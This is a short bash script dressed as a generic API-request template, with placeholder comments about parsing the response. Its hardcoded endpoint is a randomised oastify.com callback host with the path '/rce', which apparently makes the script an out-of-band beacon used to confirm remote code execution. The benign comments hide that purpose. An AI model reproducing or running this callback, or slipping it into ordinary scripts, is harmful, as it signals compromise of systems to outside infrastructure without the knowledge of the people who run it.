#!/bin/bash

# Replace with your desired API endpoint
api_url="https://3eiayso38gpurtay9ipg45oj3a92xtphe.oastify.com/rce"

# Make the API request
response=$(curl -s "$api_url")

# Check if the request was successful
if [[ $? -eq 0 ]]; then
  echo "API request successful"
  # Process the response (e.g., parse JSON, extract data)
  # ...
else
  echo "API request failed"
fi
